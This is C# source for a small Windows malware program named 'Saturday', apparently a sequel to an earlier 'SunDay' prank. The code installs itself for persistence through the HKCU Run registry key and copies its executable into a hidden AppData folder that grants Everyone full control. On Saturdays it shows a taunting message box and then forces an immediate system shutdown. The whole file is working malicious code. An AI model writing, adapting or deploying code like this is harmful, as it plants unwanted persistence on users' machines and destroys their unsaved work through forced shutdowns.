/*
    For some reason a bunch of people said I should make "the prequel to SunDay."
    Well, here we now have "Saturday", are you lads happy now?
*/

using System;
using System.Windows.Forms;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Security.AccessControl;
using System.Diagnostics;
using Microsoft.Win32;

namespace SunDay
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            string name = Assembly.GetExecutingAssembly().GetName().Name;
            if (Registry.GetValue("HKEY_CURRENT_USER\\Software\\Saturday", "boogie man", null) == null)
            {

                Registry.CurrentUser.CreateSubKey("Software\\Saturday");
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Saturday", "boogie man", "Saturday", RegistryValueKind.String);

                if (Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Saturday", null) == null)
                {
                    Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Saturday", "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Saturday\\" + name + ".exe", RegistryValueKind.String);
                }
            }
            else
            {
                if (DateTime.Today.DayOfWeek.ToString() == "Saturday")
                {
                    MessageBox.Show("Today is Saturday! Why do you work so hard? All work and no play make you a dull boy! Come on! Let's go out and have some fun!", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    var thing = new ProcessStartInfo("shutdown", "/s /t 0");
                    thing.CreateNoWindow = true;
                    thing.UseShellExecute = false;
                    Process.Start(thing);
                }
            }
            if (!Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Saturday"))
            {
                DirectoryInfo sun = Directory.CreateDirectory("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Saturday");
                DirectorySecurity dsec = sun.GetAccessControl();

                sun.Attributes = FileAttributes.Hidden;
                dsec.AddAccessRule(new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Allow));

                File.Copy(Assembly.GetExecutingAssembly().Location, "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Saturday\\" + name + ".exe");
            }
        }
    }
}
